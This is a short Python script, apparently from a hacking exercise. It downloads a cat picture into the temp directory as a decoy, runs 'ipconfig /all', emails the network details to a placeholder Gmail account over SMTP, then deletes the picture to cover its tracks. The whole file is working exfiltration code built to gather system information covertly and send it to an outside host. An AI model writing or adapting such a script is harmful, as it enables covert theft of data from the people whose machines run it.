#!/usr/bin/env python
import subprocess, smtplib, requests, os, tempfile

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    get_response = requests.get(url)
    #print(get_response.content)
    file_name=url.split("/")[-1]
    #print(file_name)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://icatcare.org/app/uploads/2018/07/Thinking-of-getting-a-cat.png")
command = "ipconfig /all"
result = subprocess.check_output(command, shell=True)

send_mail("Your email", "Your password", result)
os.remove("Thinking-of-getting-a-cat.png")
